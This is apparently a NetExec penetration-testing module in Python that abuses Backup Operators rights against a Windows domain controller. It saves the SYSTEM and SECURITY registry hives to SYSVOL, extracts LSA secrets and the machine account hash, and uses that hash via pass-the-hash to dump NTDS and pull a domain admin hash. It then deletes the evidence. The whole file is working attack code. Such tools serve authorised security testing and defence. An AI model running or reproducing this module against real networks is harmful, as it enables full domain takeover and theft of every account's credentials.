import contextlib

from impacket.examples.secretsdump import LSASecrets, LocalOperations
from impacket.smbconnection import SessionError
from impacket.dcerpc.v5 import rrp
from nxc.helpers.misc import CATEGORY, gen_random_string
from nxc.helpers.rpc import NXCRPCConnection


class NXCModule:
    name = "backup_operator"
    description = "Exploit user in backup operator group to dump NTDS @mpgn_x64"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.machine_account = None
        self.machine_account_hash = None

    def options(self, context, module_options):
        """NO OPTIONS"""

    def on_login(self, context, connection):
        connection.args.share = "SYSVOL"
        rand_suffix = gen_random_string(8)

        # enable remote registry
        context.log.display("Triggering RemoteRegistry to start through named pipe...")
        connection.trigger_winreg()
        dce = NXCRPCConnection(connection).connect(r"\winreg", rrp.MSRPC_UUID_RRP)

        try:
            for hive in ["HKLM\\SYSTEM", "HKLM\\SECURITY"]:
                hRootKey, subKey = self._strip_root_key(dce, hive)
                outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}_{rand_suffix}"
                context.log.debug(f"Dumping {hive}...")
                ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
                rrp.hBaseRegSaveKey(dce, ans2["phkResult"], outputFileName)
                context.log.highlight(f"Saved {hive} to {outputFileName}")
        except Exception as e:
            context.log.fail(f"Unexpected error during hive dump: {e}")
            return
        finally:
            with contextlib.suppress(Exception):
                dce.disconnect()

        # copy remote files to local
        for hive in ["SECURITY", "SYSTEM"]:
            connection.get_file_single(f"{hive}_{rand_suffix}", f"{connection.output_filename}.{hive}")

        # read local file
        try:
            def parse_lsa(secret_type, secret):
                context.log.highlight(secret)
                for line in secret.splitlines():
                    if "aad3b" in line.lower() and len(line.split(":")) >= 3:
                        fields = line.split(":")
                        account_name = fields[0].split("\\")[-1] if "\\" in fields[0] else fields[0]
                        if account_name.endswith("$"):
                            self.machine_account = account_name
                            self.machine_account_hash = fields[2]

            local_path = f"{connection.output_filename}."
            local_operations = LocalOperations(local_path + "SYSTEM")
            boot_key = local_operations.getBootKey()

            LSA = LSASecrets(local_path + "SECURITY", boot_key, None, isRemote=False, perSecretCallback=parse_lsa)
            LSA.dumpCachedHashes()
            LSA.dumpSecrets()
        except Exception as e:
            context.log.fail(f"Fail to dump the lsa: {e!s}")

        # Attempt NTDS dump with DC Machine Account
        cleanup_user, cleanup_hash = None, None
        if self._try_dump_ntds(connection, context, self.machine_account, self.machine_account_hash):
            cleanup_user, cleanup_hash = self._extract_da_hash(connection.output_filename, context)
            if not cleanup_user or not cleanup_hash:
                # Fallback to cleaning up using the machine account if DA could not be extracted
                cleanup_user, cleanup_hash = self.machine_account, self.machine_account_hash

        # Final Cleanup using native SMB deleteFile
        if cleanup_user and cleanup_hash:
            self._perform_cleanup(connection, context, cleanup_user, cleanup_hash, rand_suffix)
        else:
            context.log.fail("Failed to obtain suitable credentials for NTDS dump or cleanup.")
            self._print_cleanup_warning(context, rand_suffix)

    def _try_dump_ntds(self, connection, context, username, user_hash):
        if not username or not user_hash:
            return False
        context.log.display(f"Attempting NTDS dump with: {username}")
        with contextlib.suppress(Exception):
            connection.conn.logoff()
        connection.create_conn_obj()
        if connection.hash_login(connection.domain, username, user_hash):
            try:
                context.log.display(f"Dumping NTDS using {username}...")
                connection.ntds()
                return True
            except Exception as e:
                context.log.fail(f"Fail to dump the NTDS with {username}: {e!s}")
        return False

    def _perform_cleanup(self, connection, context, username, user_hash, rand_suffix):
        context.log.display(f"Using {username} to clean up files...")
        with contextlib.suppress(Exception):
            connection.conn.logoff()
        connection.create_conn_obj()
        if connection.hash_login(connection.domain, username, user_hash):
            context.log.display(f"Cleaning dump with user {username} on domain {connection.domain}")
            hives = ["SECURITY", "SYSTEM"]
            all_deleted = True
            for hive in hives:
                remote_name = f"{hive}_{rand_suffix}"
                try:
                    connection.conn.deleteFile("SYSVOL", remote_name)
                    context.log.debug(f"File {remote_name} deleted successfully via SMB.")
                except SessionError as e:
                    if "STATUS_NO_SUCH_FILE" in str(e):
                        context.log.debug(f"File {remote_name} already removed or not found.")
                        continue
                    if "STATUS_ACCESS_DENIED" in str(e):
                        context.log.debug(f"SMB deleteFile for {remote_name} got access denied. Attempting deletion via cmd execution...")
                        try:
                            # Attempt to delete via execute command if direct SMB share delete gets ACCESS_DENIED
                            connection.execute(f"del C:\\Windows\\sysvol\\sysvol\\{remote_name}")
                            continue
                        except Exception as exec_err:
                            context.log.debug(f"Failed to delete {remote_name} via command execution: {exec_err}")
                    all_deleted = False
                    context.log.fail(f"Fail to remove the file {remote_name}: {e!s}")

            if all_deleted:
                # Double check that files are gone
                double_check = True
                for hive in hives:
                    remote_name = f"{hive}_{rand_suffix}"
                    try:
                        if connection.conn.listPath("SYSVOL", remote_name):
                            double_check = False
                            context.log.fail(f"File {remote_name} still exists on C:\\Windows\\sysvol\\sysvol\\{remote_name}")
                    except SessionError:
                        pass
                if double_check:
                    context.log.display("Successfully deleted dump files !")
                    return

        self._print_cleanup_warning(context, rand_suffix)

    def _extract_da_hash(self, output_filename, context):
        try:
            with open(f"{output_filename}.ntds") as f:
                first_line = f.readline().strip()
                if first_line:
                    fields = first_line.split(":")
                    if len(fields) >= 4:
                        da_user = fields[0].split("\\")[-1] if "\\" in fields[0] else fields[0]
                        return da_user, fields[3]
        except Exception as e:
            context.log.debug(f"Failed to read NTDS file for cleanup: {e}")
        return None, None

    def _print_cleanup_warning(self, context, rand_suffix):
        context.log.fail(f"Files were not automatically deleted. Please clean up manually: C:\\Windows\\sysvol\\sysvol\\SECURITY_{rand_suffix}, SYSTEM_{rand_suffix}")

    def _strip_root_key(self, dce, key_name):
        # Let's strip the root key
        key_name.split("\\")[0]
        sub_key = "\\".join(key_name.split("\\")[1:])
        ans = rrp.hOpenLocalMachine(dce)
        h_root_key = ans["phKey"]
        return h_root_key, sub_key
